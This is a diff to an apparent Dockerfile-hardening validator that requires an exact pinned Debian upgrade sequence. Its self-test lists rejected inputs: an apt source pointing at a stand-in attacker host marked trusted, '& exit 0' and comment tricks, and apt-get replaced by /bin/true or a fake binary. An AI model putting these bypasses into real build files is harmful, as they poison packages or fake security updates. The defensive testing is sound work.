@@ -12,6 +12,13 @@ const EXPECTED_DEPLOYMENT_ASSETS = new Set([
 ]);
 const PINNED_NODE_BASE =
   "node:24.20.0-trixie-slim@sha256:50c3b2f6988dfc307b86e5301d69611af31f4789bdf232863b07d3b02fe55ae0";
+const PINNED_OS_STEPS = [
+  "rm -f /etc/apt/sources.list.d/debian.sources",
+  "printf '%s\\n' 'deb [check-valid-until=no] http://snapshot.debian.org/archive/debian/20260923T120000Z trixie main' 'deb [check-valid-until=no] http://snapshot.debian.org/archive/debian-security/20260923T120000Z trixie-security main' > /etc/apt/sources.list",
+  "apt-get -o Acquire::Check-Valid-Until=false update",
+  "apt-get -y --no-install-recommends upgrade",
+  "apt-get install -y --no-install-recommends ca-certificates=20250419 curl=8.14.1-2+deb13u5 libssl3t64=3.5.7-1~deb13u2 openssl=3.5.7-1~deb13u2 openssl-provider-legacy=3.5.7-1~deb13u2",
+];
 const SEMVER_NUMERIC_IDENTIFIER = "(?:0|[1-9][0-9]*)";
 const SEMVER_PRERELEASE_IDENTIFIER =
   "(?:0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*)";
@@ -85,6 +92,9 @@ function hasPinnedOsUpgrade(source) {
     // The canonical upgrade instruction needs no expansion. Reject it even
     // inside quotes: double-quoted substitutions still execute shell commands.
     if (/[$`]/.test(shell)) return false;
+    const literalSteps = shell.replace(/^RUN\s+/i, "").split(/\s*&&\s*/)
+      .map((step) => step.trim().replace(/\s+/g, " "));
+    if (!PINNED_OS_STEPS.every((step, index) => literalSteps[index] === step)) return false;
     let quote = null;
     let commands = "";
     for (let i = 0; i < shell.length; i++) {
@@ -110,14 +120,7 @@ function hasPinnedOsUpgrade(source) {
     // groups, substitutions and early-exit builtins can make a skipped upgrade
     // look like a successful image build, so do not try to interpret them.
     if (quote || /[|;(){}$&]/.test(commands.replaceAll("&&", "")) || commands.includes("<<")) return false;
-    const steps = commands.replace(/^[ \t]*RUN\s+/i, "").split(/\s*&&\s*/).map((step) => step.trim());
-    const upgrade = steps.indexOf("apt-get -y --no-install-recommends upgrade");
-    if (upgrade < 0) return false;
-    return steps.slice(0, upgrade).every((step) =>
-      step === "rm -f /etc/apt/sources.list.d/debian.sources" ||
-      /^printf _+(?:\s+_+)+\s+>\s+\/etc\/apt\/sources\.list$/.test(step) ||
-      /^apt-get(?: -o Acquire::Check-Valid-Until=false)? update$/.test(step)
-    );
+    return true;
   });
 }
 
@@ -355,13 +358,21 @@ function selfTest() {
     throw new Error("container hardening self-test classified a normal workflow as Kubernetes");
   }
   const slash = String.fromCharCode(92);
+  const canonicalUpgrade = `RUN ${PINNED_OS_STEPS.join(" && ")}`;
   for (const source of [
-    "RUN apt-get -y --no-install-recommends upgrade",
-    `RUN apt-get update ${slash}\n  && apt-get -y --no-install-recommends upgrade ${slash}\n  && true`,
+    canonicalUpgrade,
+    `RUN ${PINNED_OS_STEPS.join(` ${slash}\n && `)} && true`,
   ]) {
     if (!hasPinnedOsUpgrade(source)) throw new Error("missing real OS upgrade instruction");
   }
   for (const source of [
+    "RUN apt-get -y --no-install-recommends upgrade",
+    canonicalUpgrade.replace(PINNED_OS_STEPS[1], "printf '%s\\n' 'deb [trusted=yes] http://attacker.invalid trixie main' > /etc/apt/sources.list"),
+    canonicalUpgrade.replace(`${PINNED_OS_STEPS[2]} && `, ""),
+    `${canonicalUpgrade} & exit 0`,
+    canonicalUpgrade.replace(" upgrade &&", " upgrade# & exit 0 &&"),
+    `RUN ln -sf /bin/true /usr/bin/apt-get\n${canonicalUpgrade}`,
+    `USER root\n${canonicalUpgrade}`,
     "RUN ln -sf /bin/true /usr/bin/apt-get\nRUN apt-get -y --no-install-recommends upgrade",
     "COPY fake-apt /usr/bin/apt-get\nRUN apt-get -y --no-install-recommends upgrade",
     "ENV PATH=/fake\nRUN apt-get -y --no-install-recommends upgrade",
